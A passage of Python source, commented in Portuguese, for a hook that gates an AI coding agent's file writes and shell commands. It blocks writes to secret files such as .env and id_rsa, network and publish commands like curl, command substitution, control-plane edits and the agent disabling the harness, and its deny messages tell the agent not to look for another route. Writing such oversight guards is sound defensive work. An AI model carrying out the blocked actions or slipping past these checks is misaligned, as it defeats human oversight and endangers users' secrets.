# (este hook e stdlib-only e nao consegue importar `harness`) -- la estao os
# motivos de cada verbo, e la o session_permissions le a MESMA lista para
# declarar a superficie no settings.local.json. Uma lista, nao duas.
# Emitida por json.dumps, e nao por repr: as aspas duplas mantem o estilo do
# resto do hook gerado, e ha teste que procura `"verbo"` neste texto.
''' + f"""_HARNESS_SUBCOMMANDS = {json.dumps(list(HARNESS_CLI_VERBS))}
FIXED_HARNESS_SEQUENCES = (
    [["harness", sub] for sub in _HARNESS_SUBCOMMANDS]
    + [["python", "-m", "harness.cli", sub] for sub in _HARNESS_SUBCOMMANDS]
)

# --- comandos extras declarados em governance.extra_allowed_commands
# (.harness/harness.yaml): NAO ha constante bakeada aqui. Item 3 do backlog do
# dogfood venv-Windows — a lista e lida do YAML a cada tool call por
# read_extra_allowed_commands_runtime (faixa GERADA acima), ancorada no
# repo_root, para que editar o arquivo baste e `compile-session` deixe de ser
# obrigatorio a cada ajuste de allowlist. Ressalva honesta: o settings.json
# (permissions nativas) continua compilado, entao um comando adicionado sem
# recompilar passa no guard mas ainda pode cair no prompt de permissao do
# Claude Code — atrito, nao bloqueio. ---

# --- branches onde git commit direto e proibido (so via PR) — finding C do
# dogfood 2026-07-22; governance.protected_branches do harness.yaml, bakeado
# na instalacao como as constantes acima ---
PROTECTED_BRANCHES = {baked_protected_branches!r}
""" + '''


def _protected_branch_commit_problem(command, cwd):
    """Razao de deny se `command` contem `git commit` e a branch atual e
    protegida; `None` caso contrario. Incondicional (postura de floor):
    roda antes da checagem de contrato — commit direto em main/homolog/
    develop e proibido mesmo sem contrato ativo."""
    if not _has_sequence(_tokenize_command(command), ["git", "commit"]):
        return None
    branch = _current_git_branch(cwd)
    if branch is None or branch not in PROTECTED_BRANCHES:
        return None
    return (
        "branch protegida '" + branch + "' - commit direto proibido, so via PR. "
        "A MENSAGEM do commit NAO e o problema: `-m`, `-F -` e mensagem "
        "multi-linha sao todos allow fora de branch protegida - nao reescreva a "
        "mensagem, troque de branch. Saida: `git checkout -b <tipo>/<slug>` "
        "(ex.: feat/minha-mudanca) e commite la; ou rode `harness "
        "compile-session`, que posiciona em contract/<slug> automaticamente "
        "quando ha contrato ativo. TERCEIRA saida, e ela NAO e do agente: se "
        "esta mudanca e chore de doc/versao que a politica do repo manda ir "
        "direto para a main (CHANGELOG, bump de versao, correcao de texto), "
        "ela nao passa por aqui - peca ao HUMANO para rodar o commit no "
        "terminal dele, fora do Claude Code, e siga em frente. Nao procure "
        "outra rota nem insista neste comando"
    )


def _push_floor_problem(command, cwd):
    """Razao de deny para um comando que bateu no floor, ou `None` quando e um
    `git push` seguro da branch do contrato ativo (item 6 do backlog do
    dogfood miojo).

    Roda SO para comando que ja casou `is_floor_bash_command` — comando que
    bateu no floor por outro motivo (curl, npm publish) nao tem a forma
    `git push` e recebe de volta a razao generica de floor. Le o slug do
    contrato do `feature_list.json`; sem contrato, o push e negado."""
    feature_list = _load_json(cwd, FEATURE_LIST_PATH)
    contract_slug = ""
    if isinstance(feature_list, dict):
        contract_slug = str(feature_list.get("contract") or "")
    return contract_branch_push_problem(
        command, _current_git_branch(cwd), contract_slug, PROTECTED_BRANCHES
    )


# Item 5 do backlog do dogfood venv-Windows: o deny de comando mandava
# "replaneje via /harness-creator:plan", que e o caminho MAIS CARO e, para
# comando, nem sequer o certo - replanejar muda files[]/verify_cmd de uma
# tarefa, nao a allowlist permanente. O escape real e o YAML de governanca, e
# ele so pode ser editado pelo usuario no terminal proprio (o agente nao
# escreve em .harness/** - floor do plano de controle). Dizer isso na hora do
# deny evita o ciclo de tentativa-e-erro que a sessao real gastou.
# `command_escape_hint(<comando negado>)` vem da faixa GERADA acima e monta a
# razao de deny COM o bloco YAML pronto para colar. Postura C do Item 9: nao ha
# CLI de allow-command; o caminho e o usuario editar o harness.yaml, e essa
# decisao so se sustenta se editar for trivial.

FEATURE_LIST_PATH = ".harness/feature_list.json"
PROFILE_PATH = ".harness/repo-profile.json"
EVIDENCE_DIR_NAME = ".harness/evidence"
UNSCOPED_EVIDENCE_DIR_NAME = "_sem-contrato"
TEAM_MANIFEST_RELATIVE_PATH = ".harness/team/manifest.json"
REVIEW_DIR = ".harness/review"
# WORK_DIR_PREFIX (area de autoria de contrato) e SCRATCH_DIR_PREFIX (area de
# scratch para artefato temporario de verificacao) vem da faixa GERADA acima,
# junto com _is_work_surface_path/_is_scratch_surface_path (normalizacao
# anti-traversal) - fonte unica em harness.boundary_guard.

# INSTALL_COMMAND_BY_PACKAGE_MANAGER e install_command_for vem da faixa GERADA
# acima (fonte unica em harness.install_command) — a copia digitada a mao que
# ficava aqui era uma das tres que carregavam o mesmo defeito do achado F2.


def _glob_to_regex(glob):
    """Mesmo algoritmo de harness.verification.tdd_loop._glob_to_regex,
    copiado inline (o hook não pode importar a lib)."""
    escaped = re.escape(glob.replace("\\\\", "/"))
    escaped = escaped.replace(r"\\*\\*/", "(?:.*/)?")
    escaped = escaped.replace(r"\\*\\*", ".*")
    escaped = escaped.replace(r"\\*", "[^/]*")
    escaped = escaped.replace(r"\\?", "[^/]")
    return re.compile("^" + escaped + "$")


def _resolve_path(raw_path, cwd):
    path = (raw_path or "").replace("\\\\", "/")
    cwd_norm = (cwd or "").replace("\\\\", "/").rstrip("/")
    if cwd_norm and path.lower().startswith(cwd_norm.lower() + "/"):
        path = path[len(cwd_norm) + 1:]
    return path


def _split_shell_segments(command):
    """Segmenta a string do comando nos operadores de controle de shell
    (`;`, `&&`, `||`, `|`, `&` de background, newline `\\n` e carriage-return
    `\\r`), devolvendo a lista de sub-comandos nao-vazios. Respeita aspas e
    double-quotes de shell (operadores dentro de strings nao causam
    segmentacao). `&&`/`||` sao casados ANTES de `&`/`|` isolados para nao
    quebrar um `&&` em dois `&`. `&` precedido de `>` NAO segmenta: `>&` e
    operador de REDIRECIONAMENTO (`2>&1`, `>&2`), nao de controle - antes
    desta regra, `pytest -q 2>&1` virava os segmentos ['pytest -q 2>', '1']
    e o '1' orfao derrubava o comando inteiro em falso-deny."""
    if not command:
        return []
    result = []
    current = []
    in_single = False
    in_double = False
    escape_next = False
    i = 0
    while i < len(command):
        ch = command[i]
        if escape_next:
            current.append(ch)
            escape_next = False
        elif ch == "\\\\" and not in_single:
            escape_next = True
        elif ch == "'" and not in_double:
            in_single = not in_single
            current.append(ch)
        elif ch == '"' and not in_single:
            in_double = not in_double
            current.append(ch)
        elif (
            ch in ("&", "|", ";", "\\n", "\\r") and not in_single and not in_double
            and not (ch == "&" and current and current[-1] == ">")
        ):
            seg = "".join(current).strip()
            if seg:
                result.append(seg)
            current = []
            if ch == "&" and i + 1 < len(command) and command[i + 1] == "&":
                i += 1
            elif ch == "|" and i + 1 < len(command) and command[i + 1] == "|":
                i += 1
        else:
            current.append(ch)
        i += 1
    seg = "".join(current).strip()
    if seg:
        result.append(seg)
    return result


def _segment_prefixes_any(seg_tokens, sequences):
    """True se os tokens do segmento PREFIXAM (tokens[:n] == seq, nao mais
    'aparece em qualquer janela') alguma das sequencias permitidas.

    Item 4 do backlog do dogfood venv-Windows: a comparacao roda tambem
    sobre a FORMA NORMALIZADA de invocacao (normalize_invocation_tokens, faixa
    GERADA acima) dos DOIS lados. Normalizar so o segmento nao resolveria o
    caso simetrico - com `extra_allowed_commands: ["python -m ruff"]`, quem
    precisa normalizar para `ruff` e a ENTRADA DA ALLOWLIST, para que
    `ruff check .` passe. Como as duas pontas reduzem a mesma forma canonica,
    isto e equivalencia de forma, nunca ampliacao de escopo:
    `python -m pip install evil` normaliza para `pip install evil`, que
    continua nao prefixando `pip install -e .`."""
    candidates = [list(seg_tokens)]
    normalized_seg = normalize_invocation_tokens(seg_tokens)
    if normalized_seg != candidates[0]:
        candidates.append(normalized_seg)
    for seq in sequences:
        if not seq:
            continue
        variants = [seq]
        normalized_seq = normalize_invocation_tokens(seq)
        if normalized_seq and normalized_seq != seq:
            variants.append(normalized_seq)
        for variant in variants:
            n = len(variant)
            for candidate in candidates:
                if candidate[:n] == variant:
                    return True
    return False


def _load_json(cwd, relative):
    base = cwd or "."
    path_str = relative
    try:
        import os
        full = os.path.join(base, relative)
        with open(full, "r", encoding="utf-8") as fh:
            return json.load(fh)
    except (OSError, ValueError):
        return None


def _profile_entry_value(profile, key):
    if not isinstance(profile, dict):
        return None
    entry = profile.get(key)
    if isinstance(entry, dict):
        return entry.get("value")
    return None


def _profile_entry_evidence(profile, key):
    """Campo `evidence` de uma entrada do profile — o arquivo que PROVOU o
    achado. `install_command_for` usa o do `package_manager` para distinguir o
    repo que e um pacote instalavel do que so declara requirements."""
    if not isinstance(profile, dict):
        return None
    entry = profile.get(key)
    if isinstance(entry, dict):
        return entry.get("evidence")
    return None


def _profile_extra_value(profile, key):
    if not isinstance(profile, dict):
        return None
    extras = profile.get("extras")
    if not isinstance(extras, dict):
        return None
    entry = extras.get(key)
    if isinstance(entry, dict):
        return entry.get("value")
    return None


def _collect_allowed_files(feature_list, cwd=None):
    """Devolve (literais_exatos, prefixos_de_diretorio, padroes_glob_compilados)
    a partir de `files[]` de todas as tarefas.

    NAO faz mais disco-walk para expandir glob: um `Write` cria arquivo que
    ainda nao existe no disco no momento em que o hook roda, entao casar glob
    so contra arquivos ja existentes nunca reconhece o proprio arquivo que a
    tarefa esta tentando criar (ex.: migration nova, teste novo). Em vez
    disso o candidato e casado direto contra o padrao em `_path_in_surface`.
    `cwd` mantido no parametro por compat de assinatura, sem uso.
    """
    literals = set()
    prefixes = []
    patterns = []

    for feat in (feature_list or {}).get("features", []) or []:
        for f in feat.get("files") or []:
            normalized = str(f).replace("\\\\", "/")
            if "*" in normalized or "?" in normalized:
                patterns.append(_glob_to_regex(normalized))
            elif normalized.endswith("/"):
                prefixes.append(normalized)
            else:
                literals.add(normalized)

    return literals, prefixes, patterns


def _path_in_surface(path, surface):
    literals, prefixes, patterns = surface
    if path in literals:
        return True
    if any(path.startswith(prefix) for prefix in prefixes):
        return True
    return any(pattern.match(path) for pattern in patterns)


def _collect_allowed_bash_commands(feature_list, profile):
    commands = []
    for feat in (feature_list or {}).get("features", []) or []:
        vc = feat.get("verify_cmd")
        if vc:
            commands.append(vc)
    # O test_command mora no TOPO do profile, nao em extras (diferente de
    # lint/typecheck/build) - ficar de fora foi omissao, nao decisao: o lint do
    # projeto rodava a qualquer hora e o teste do projeto so na grafia exata do
    # verify_cmd da tarefa, entao nao havia como testar mudanca em codigo
    # compartilhado contra o resto da suite antes do commit.
    test_command = _profile_entry_value(profile, "test_command")
    if test_command:
        commands.append(test_command)
    for key in ("lint_command", "typecheck_command", "build_command"):
        value = _profile_extra_value(profile, key)
        if value:
            commands.append(value)
    install_cmd = install_command_for(
        _profile_entry_value(profile, "package_manager"),
        _profile_entry_evidence(profile, "package_manager"),
    )
    if install_cmd:
        commands.append(install_cmd)
    return commands


def _is_test_diff(feature, cwd):
    """Equivalente standalone de harness.review.is_test_diff — o hook nao
    pode importar a lib, entao replica: casa feature['files'] contra o
    test_glob do repo-profile usando o _glob_to_regex ja copiado acima."""
    profile = _load_json(cwd, PROFILE_PATH)
    test_glob = _profile_entry_value(profile, "test_glob")
    if not test_glob:
        return False
    pattern = _glob_to_regex(test_glob)
    files = (feature or {}).get("files") or []
    for f in files:
        normalized = str(f).replace("\\\\", "/")
        if pattern.match(normalized):
            return True
    return False


def _load_review_record(cwd, feature_id):
    """Equivalente standalone de harness.review.load_review: devolve
    (record, problema). Arquivo ausente -> registro DEFAULT status='pending'
    (mesmo comportamento de load_review, sem gravar em disco); JSON invalido
    -> (None, problema)."""
    import os
    base = cwd or "."
    full = os.path.join(base, REVIEW_DIR, str(feature_id) + ".json")
    if not os.path.isfile(full):
        return {
            "feature_id": feature_id,
            "status": "pending",
            "iteration": 0,
            "max_iterations": 3,
            "history": [],
            "justification": None,
            "updated_at": "",
        }, None
    try:
        with open(full, "r", encoding="utf-8") as fh:
            data = json.load(fh)
    except (OSError, ValueError):
        return None, str(feature_id) + ": registro de revisao invalido (JSON malformado)"
    if not isinstance(data, dict):
        return None, str(feature_id) + ": registro de revisao invalido (formato inesperado)"
    return data, None


def _review_gate_problem(cwd, feature_id, feature_data, commit_ts, evidence):
    record, load_problem = _load_review_record(cwd, feature_id)
    if load_problem:
        return load_problem

    status = record.get("status")
    if status != "approved":
        return (
            str(feature_id) + ": revisao pendente/rejeitada (status='" + str(status) + "') - "
            "rode harness review " + str(feature_id) + " approve antes"
        )

    review_dt = _parse_iso8601(record.get("updated_at"))
    if review_dt is None:
        return str(feature_id) + ": registro de revisao sem updated_at valido"

    if commit_ts is not None:
        commit_dt = _parse_iso8601(commit_ts)
        if commit_dt is not None and review_dt <= commit_dt:
            return str(feature_id) + ": aprovacao mais antiga que o ultimo commit (updated_at=" + str(record.get("updated_at")) + ")"

    if evidence is not None:
        recorded_dt = _parse_iso8601(evidence.get("recorded_at"))
        if recorded_dt is not None and review_dt < recorded_dt:
            return (
                str(feature_id) + ": aprovacao obsoleta - evidencia foi regravada depois da "
                "aprovacao (evidencia.recorded_at=" + str(evidence.get("recorded_at")) +
                ", review.updated_at=" + str(record.get("updated_at")) + ")"
            )

    if _is_test_diff(feature_data, cwd):
        justification = record.get("justification")
        if not justification or not str(justification).strip():
            return str(feature_id) + ": aprovacao de diff de teste sem justificativa registrada"

    return None


def _evaluate_feature_list_edit(tool_name, tool_input, cwd):
    base = cwd or "."
    import os
    full = os.path.join(base, FEATURE_LIST_PATH)
    if os.path.isfile(full):
        with open(full, "r", encoding="utf-8") as fh:
            current_text = fh.read()
    else:
        current_text = "{}"

    if tool_name == "Write":
        proposed_text = tool_input.get("content") or ""
    else:
        old_string = tool_input.get("old_string") or ""
        new_string = tool_input.get("new_string") or ""
        if old_string and old_string not in current_text:
            return "deny", (
                "feature_list.json: old_string do Edit nao foi encontrado no "
                "arquivo atual - se esta editando mais de uma feature no mesmo "
                "Edit, confira se o bloco bate exatamente com o conteudo atual; "
                "edite uma feature por vez se nao tiver certeza"
            )
        if tool_input.get("replace_all"):
            proposed_text = current_text.replace(old_string, new_string)
        else:
            proposed_text = current_text.replace(old_string, new_string, 1)

    try:
        old_data = json.loads(current_text) if current_text.strip() else {}
    except ValueError:
        old_data = {}
    try:
        new_data = json.loads(proposed_text)
    except ValueError as exc:
        return "deny", (
            "feature_list.json: edicao proposta produz JSON invalido (" + str(exc) + ") - "
            "edite uma feature por vez ou corrija a sintaxe antes de tentar de novo"
        )

    transitioned = _transitions_to_true(old_data, new_data)
    if not transitioned:
        return None

    commit_ts = _read_last_commit_timestamp(cwd)
    problems = []
    evidence_by_id = {}
    for fid in transitioned:
        problem, evidence = _evidence_freshness_problem(
            cwd, fid, commit_ts, str(new_data.get("contract") or "")
        )
        if problem:
            problems.append(problem)
        else:
            evidence_by_id[fid] = evidence

    if problems:
        return "deny", (
            "feature-lock: transicao para passes:true sem evidencia fresca - "
            + "; ".join(problems)
            + " - rode harness verify <id> primeiro"
        )

    manifest = _read_team_manifest(cwd)
    review_required = _manifest_requires_review(manifest)
    if review_required:
        review_problems = []
        for fid in transitioned:
            problem = _review_gate_problem(
                cwd, fid, _feature_by_id(new_data, fid), commit_ts, evidence_by_id.get(fid)
            )
            if problem:
                review_problems.append(problem)
        if review_problems:
            return "deny", (
                "feature-lock: revisao do time (produtor-revisor) pendente/obsoleta - "
                + "; ".join(review_problems)
            )

    success_message = (
        "feature-lock: transicao para passes:true com evidencia fresca confirmada para "
        + ", ".join(str(fid) for fid in sorted(transitioned, key=str))
    )
    if review_required:
        success_message += " e revisao do time (produtor-revisor) aprovada"
    return "allow", success_message


def _evaluate_file(path, cwd):
    if is_floor_secret_path(path):
        return "deny", (
            "runtime floor: escrita em arquivo de segredo (.env/.pem/id_rsa/"
            "credentials) e bloqueio incondicional, independente de contrato ativo"
        )

    if is_floor_disable_sentinel_path(path):
        return "deny", (
            "runtime floor: criar/editar o sentinel de kill-switch "
            "(.harness/harness.disabled) e bloqueio incondicional - o agente nao "
            "pode se auto-desativar; para desativar o harness, rode `harness disable` "
            "no SEU terminal (fora do Claude Code, onde nenhum hook intercepta)"
        )

    if is_floor_control_plane_path(path):
        return "deny", (
            "runtime floor: escrita no plano de controle do harness (.harness/**, "
            "exceto work/ e scratch/) e bloqueio incondicional - estes arquivos "
            "DEFINEM a superficie que o guard aplica, entao edita-los seria "
            "auto-ampliacao de superficie sem gate humano; declara-los em files[] "
            "de uma tarefa NAO abre excecao. Se a governanca precisa mudar, edite "
            ".harness/harness.yaml no SEU terminal (fora do Claude Code) e rode "
            "`harness compile-session`; para o proximo contrato, use "
            ".harness/work/<slug>/ (sempre gravavel)"
        )

    if _is_claude_memory_path(path):
        return "allow", (
            "diretorio de memoria do Claude Code (.claude/projects/<slug>/memory/**) "
            "e sempre fora do repo_root por design - bookkeeping do proprio agente "
            "entre sessoes, nao arquivo do contrato ativo; boundary_guard nao gateia"
        )

    if _is_work_surface_path(path):
        return "allow", (
            "area de autoria de contrato (.harness/work/**) sempre gravavel - "
            "permite planejar o proximo contrato sem replanejar o atual"
        )

    if _is_scratch_surface_path(path):
        return "allow", (
            "area de scratch (.harness/scratch/**) sempre gravavel - destino "
            "correto de artefato temporario de verificacao (screenshot, dump "
            "de rede, HTML de debug); auto-ignorada pelo git, apagavel a "
            "qualquer momento, nunca referencie de codigo"
        )

    if _is_progress_file_path(path):
        return "allow", (
            ".harness/progress.md e bookkeeping do proprio harness (o lifecycle "
            "manda atualiza-lo a cada sessao) - sempre gravavel, mesmo padrao "
            "de .harness/work/** e docs/**"
        )

    if _is_docs_surface_path(path):
        return "allow", (
            "docs/** e superficie de documentacao dedicada (Item 4) - prosa nao "
            "quebra teste; AGENTS.md/CLAUDE.md/Plans.md/spec.md/.harness/harness.yaml "
            "permanecem protegidos (excluidos explicitamente desta allowlist)"
        )

    feature_list = _load_json(cwd, FEATURE_LIST_PATH)
    if feature_list is None:
        return "deny", (
            "nenhum contrato ativo no projeto. Rode /harness-creator:plan para compilar "
            "um contrato e autorizar a superfície de edição; artefatos temporários "
            "(screenshot, dump, HTML de debug) podem ser salvos em .harness/scratch/"
        )
    if _contract_fully_passed(feature_list):
        return "allow", (
            "contrato concluido (todas as features com passes:true) - boundary_guard "
            "se aposenta da superficie de escrita ate o proximo /harness-creator:plan; "
            "floor (segredo/rede/push) continua incondicional"
        )

    surface = _collect_allowed_files(feature_list, cwd)
    profile = _load_json(cwd, PROFILE_PATH)
    test_glob = _profile_entry_value(profile, "test_glob")

    if test_glob:
        pattern = _glob_to_regex(test_glob)
        if pattern.match(path):
            if _path_in_surface(path, surface):
                return "allow", "arquivo de teste declarado em files[] de uma tarefa do contrato ativo"
            return "deny", (
                "arquivo de teste protegido: nenhuma tarefa do contrato ativo declara "
                "este arquivo em files[] - enfraquecimento de teste fora do escopo aprovado"
            )

    if _path_in_surface(path, surface):
        return "allow", "arquivo declarado em files[] de uma tarefa do contrato ativo"
    return "deny", (
        "arquivo fora da superficie do contrato ativo (nenhuma tarefa declara este "
        "path em files[]); artefato temporario de verificacao (screenshot, dump, "
        "HTML de debug)? salve em .harness/scratch/ ; se este arquivo PERTENCE ao "
        "escopo ja aprovado, o escape barato e `harness task add-file "
        + _pending_task_id(feature_list) + " " + path + "` (um comando, sem "
        "replanejar - ja liberado no guard); replaneje via /harness-creator:plan "
        "so se o ESCOPO mudou de verdade"
    )


def _no_contract_command_deny(command, repo_root=None):
    """Mensagem de deny do modo bootstrap (sem contrato compilado).

    Distinta de `command_escape_hint`, que aponta `harness task add-file` e
    replanejamento - inuteis quando nao ha tarefa nenhuma. Mas o bloco YAML de
    `extra_allowed_commands` (allowlist_yaml_hint) ENTRA: e o unico escape de
    comando que funciona sem contrato, porque o hook le o harness.yaml a cada
    tool call. Omiti-lo deixaria o deny sem saida nenhuma - o mesmo efeito
    pratico de apontar um escape inexistente. `repo_root` (issue #72) repassa
    a `allowlist_yaml_hint` para o bloco colavel incluir `governance:` quando
    o repo nunca rodou `/harness-creator:init`."""
    return (
        "nenhum contrato ativo no projeto: sem contrato so ficam liberados git "
        "local (status/log/diff/add/commit), subcomandos do proprio harness, "
        "utilitarios read-only e cd intra-repo. '" + (command or "")[:80] + "' "
        "esta fora disso. Dois caminhos. (1) Se este comando faz parte de "
        "trabalho a ser planejado, rode /harness-creator:plan (ou a sequencia "
        "harness analyze -> harness compile -> harness compile-contract -> "
        "harness compile-session) para compilar um contrato e autorizar a "
        "superficie; artefatos temporarios (screenshot, dump, HTML de debug) "
        "podem ser salvos em .harness/scratch/. (2) "
        + allowlist_yaml_hint(command, repo_root)
    )


def _bootstrap_or_completed(cwd):
    """Passo GENUINAMENTE identico entre _evaluate_bash e _evaluate_powershell
    (item 11 do laudo, T-04/onda-3): carga do feature_list (bootstrap se
    ausente) e o allow-all de contrato concluido. Extraido pra nao divergir
    sozinho em um dos dois lados - antes desta extracao era codigo colado,
    nao uma funcao compartilhada de verdade.

    Retorna (bootstrap: bool, feature_list: list, completed: tuple|None). Se
    completed nao for None, o chamador devolve esse par (decisao, razao)
    imediatamente."""
    feature_list = _load_json(cwd, FEATURE_LIST_PATH)
    bootstrap = feature_list is None
    if bootstrap:
        return True, [], None
    if _contract_fully_passed(feature_list):
        return False, feature_list, ("allow", (
            "contrato concluido (todas as features com passes:true) - boundary_guard "
            "se aposenta da superficie de comando ate o proximo /harness-creator:plan; "
            "floor (segredo/rede/kill-switch/branch protegida) continua incondicional, "
            "e push segue restrito a branch do contrato ativo"
        ))
    return False, feature_list, None


def _build_allowed_sequences(cwd, bootstrap, feature_list):
    """Passo GENUINAMENTE identico entre _evaluate_bash e _evaluate_powershell
    (item 11 do laudo, T-04/onda-3): coleta de allowed_commands do
    profile/contrato + as sequencias fixas de git/harness + extra_allowed_commands
    do usuario. Em bootstrap (sem contrato), so as fixas + extra do usuario."""
    allowed_commands = []
    if not bootstrap:
        profile = _load_json(cwd, PROFILE_PATH)
        allowed_commands = _collect_allowed_bash_commands(feature_list, profile)
    return (
        FIXED_GIT_SEQUENCES + FIXED_HARNESS_SEQUENCES
        + [_tokenize_command(c) for c in allowed_commands]
        + [_tokenize_command(c) for c in read_extra_allowed_commands_runtime(cwd)]
    )


def _evaluate_bash(command, cwd):
    if is_floor_bash_command(command):
        # O floor de push tem UMA excecao estreita: a branch do contrato ativo
        # (item 6). Ela e avaliada aqui, antes de qualquer carga de contrato, e
        # e a autoridade sobre push em TODOS os caminhos — inclusive o allow-all
        # de contrato concluido mais abaixo, que assim nunca chega a ver um
        # comando de push. Todo o resto do floor segue incondicional.
        if is_git_push_command(command):
            push_problem = _push_floor_problem(command, cwd)
            if push_problem is not None:
                return "deny", push_problem
            return "allow", (
                "git push da branch do contrato ativo para ela mesma - a "
                "aprovacao do contrato ja autorizou este passo. Floor de push "
                "segue incondicional para branch protegida, refspec explicito, "
                "--force/--mirror/--delete e push encadeado a outro comando"
            )
        return "deny", (
            "runtime floor: comando de push/publicacao/rede nao planejado - "
            "bloqueio incondicional, independente de contrato ativo"
        )

    if is_floor_bash_secret_redirect(command):
        return "deny", (
            "runtime floor: redirecionamento (>/>>/tee) para arquivo de segredo "
            "(.env/.pem/id_rsa/credentials) e bloqueio incondicional, independente "
            "de contrato ativo - escopo restrito a redirecionamento/tee, nao "
            "persegue escrita indireta via interpretador (python -c, node -e, etc.)"
        )

    if is_floor_disable_command(command) or is_floor_bash_disable_redirect(command):
        return "deny", (
            "runtime floor: `harness disable` / criar o sentinel de kill-switch "
            "(.harness/harness.disabled) e bloqueio incondicional - o agente nao "
            "pode se auto-desativar; rode `harness disable` no SEU terminal (fora do "
            "Claude Code, onde nenhum hook intercepta)"
        )

    protected_problem = _protected_branch_commit_problem(command, cwd)
    if protected_problem:
        return "deny", protected_problem

    # Modo bootstrap: sem contrato compilado, a superficie de COMANDO nao e
    # deny total - e o minimo que permite CRIAR o contrato. Negar tudo aqui
    # (v0.22.0) travava a propria sequencia documentada no CHANGELOG
    # (analyze -> compile -> commit -> compile-contract -> compile-session):
    # `git commit` e `harness compile-contract` caiam no deny, e como
    # `harness disable` e floor, o agente ficava sem saida ate um humano
    # intervir fora do Claude Code. A superficie de ESCRITA continua deny
    # (_evaluate_file nao muda) - a inversao de seguranca do issue #35 fica
    # intacta; o que se libera aqui e floor + git local + subcomandos do
    # proprio harness + utilitarios read-only.
    bootstrap, feature_list, completed = _bootstrap_or_completed(cwd)
    if completed is not None:
        return completed

    if "$(" in command or "`" in command:
        return "deny", (
            "command substitution ($(...) ou crase) nao permitido - cada "
            "sub-comando precisa ser declarado explicitamente na superficie do contrato"
        )

    allowed_sequences = _build_allowed_sequences(cwd, bootstrap, feature_list)

    # Allow assimetrico ao floor: o floor casa 'aparece em qualquer janela'
    # (intocado, acima); o allow segmenta o comando nos operadores de controle
    # e exige que CADA segmento (1) prefixe alguma allowed_sequence, OU
    # (2) seja uso read-only aceito de utilitario da allowlist fixa
    # (cat/head/tail/wc/grep/rg/ls/echo/find, sem redirect de escrita nem
    # flags de escrita/exec), OU (3) seja `cd` com alvo dentro do repo.
    # Senao um comando arbitrario colado com &&/;/| a um declarado escaparia.
    segments = _split_shell_segments(command)
    failing = None
    for seg in segments:
        if _segment_prefixes_any(_tokenize_command(seg), allowed_sequences):
            continue
        if _is_readonly_shell_segment(seg):
            continue
        if _is_safe_cd_segment(seg, cwd):
            continue
        failing = seg
        break
    if segments and failing is None:
        return "allow", (
            "comando na superficie compilada do contrato "
            "(verify_cmd/lint/typecheck/build/install/git local), "
            "utilitario read-only ou cd intra-repo"
        )
    if failing is not None:
        if bootstrap:
            return "deny", _no_contract_command_deny(failing, cwd)
        return "deny", (
            "segmento '" + failing[:80] + "' fora da superficie compilada do "
            "contrato (verify_cmd/lint/typecheck/build/install/git local) e "
            "nao aceito como utilitario read-only (cat/head/tail/wc/grep/rg/"
            "ls/echo/find sem redirecionamento de escrita) nem cd intra-repo. "
            + command_escape_hint(failing, cwd)
        )
    if bootstrap:
        return "deny", _no_contract_command_deny(command, cwd)
    return "deny", (
        "comando fora da superficie compilada do contrato "
        "(verify_cmd/lint/typecheck/build/install/git local). "
        + command_escape_hint(command, cwd)
    )


def _looks_like_ps_write_marker(tok):
    lower = tok.lower()
    return (
        _PS_WRITE_CMDLET_PATTERN.search(tok) is not None
        or _PS_WRITEALLTEXT_PATTERN.search(tok) is not None
        or lower.startswith("-")
    )


def _extract_powershell_write_target(command):
    """Extrai o alvo de escrita de um comando PowerShell reconhecido como
    escrita (Set-Content/Out-File/Add-Content/redirecionamento >,>>/
    [IO.File]::WriteAllText e variantes), pra aplicar a MESMA logica de
    superficie de path do Edit/Write (_evaluate_file) sobre esse alvo.

    Heuristica por tokenizacao generica (reusa _tokenize_command, ja
    embutido pelo floor acima): devolve o primeiro token que NAO e o proprio
    cmdlet/marcador de escrita, NAO e uma flag (comeca com '-'), e TEM cara
    de path (contem '.', '/' ou '\\\\'). Nao e um parser completo de
    PowerShell - escopo documentado no Item 2 do backlog de correcao do
    issue #1. Devolve None se o comando nao parece um write reconhecido ou
    nenhum token com cara de path sobra apos excluir os marcadores."""
    if not command:
        return None
    is_write = (
        _PS_WRITE_CMDLET_PATTERN.search(command) is not None
        or _PS_WRITEALLTEXT_PATTERN.search(command) is not None
        or ">" in command
    )
    if not is_write:
        return None

    # Redirecionamento: o alvo e o token DEPOIS do '>'/'>>', nao o primeiro
    # token com cara de path. Sem isto, `Get-Content src/a.py > src/b.py`
    # era avaliado contra `src/a.py` (a ORIGEM) - e se a origem estivesse em
    # files[], a escrita em `src/b.py` (fora do contrato) passava. Bug de
    # superficie de escrita, independente da allowlist de leitura.
    # Sem regex de proposito: esta faixa e TEXTO dentro do template do hook
    # gerado, e sequencias de escape sao processadas na leitura do modulo -
    # um padrao com barra invertida chegaria deformado ao arquivo gerado.
    # rsplit no ultimo '>' cobre '>' e '>>'; _tokenize_command corta em
    # espaco/tab e remove aspas, entao o primeiro token do que sobra e o alvo
    # (para em '|'/';' porque estes viram tokens separados).
    if ">" in command:
        target_tokens = _tokenize_command(command.rsplit(">", 1)[1])
        if target_tokens:
            return target_tokens[0]

    for tok in _tokenize_command(command):
        if _looks_like_ps_write_marker(tok):
            continue
        if "." in tok or "/" in tok or "\\\\" in tok:
            return tok
    return None


def _evaluate_powershell(command, cwd):
    """Avaliador DEDICADO de PowerShell (Item 2 do backlog de correcao do
    issue #1) - deliberadamente NAO reusa _evaluate_bash: backtick e '$('
    sao sintaxe legitima e onipresente em PowerShell (escape/subexpressao),
    nao command smuggling, e PowerShell 5.1 nem suporta '&&'/'||'.

    Ordem: floor tool-agnostico PRIMEIRO (rede/publicacao, depois escrita em
    segredo - reusando is_floor_powershell_network/is_floor_powershell_secret_write,
    ja embutidos acima via inspect.getsource); depois, se ha um alvo de
    escrita reconhecido, a MESMA logica de superficie de path do Edit/Write
    (_evaluate_file, inclui docs/** do Item 4); senao, cai na mesma logica
    de superficie de COMANDO do Bash (verify_cmd/lint/build/install/git
    local/harness), sem as negacoes especificas de sintaxe Bash."""
    if is_floor_powershell_network(command):
        # Mesma excecao de push do _evaluate_bash (item 6) — `is_floor_powershell_network`
        # reusa `is_floor_bash_command`, entao `git push` cai aqui tambem, e as
        # duas superficies de comando precisam responder igual sobre ele. Os
        # cmdlets de rede nativos (iwr/irm) nao tem excecao nenhuma.
        if is_git_push_command(command):
            push_problem = _push_floor_problem(command, cwd)
            if push_problem is not None:
                return "deny", push_problem
            return "allow", (
                "git push da branch do contrato ativo para ela mesma - a "
                "aprovacao do contrato ja autorizou este passo. Floor de push "
                "segue incondicional para branch protegida, refspec explicito, "
                "--force/--mirror/--delete e push encadeado a outro comando"
            )
        return "deny", (
            "runtime floor: comando de rede/publicacao (PowerShell) nao "
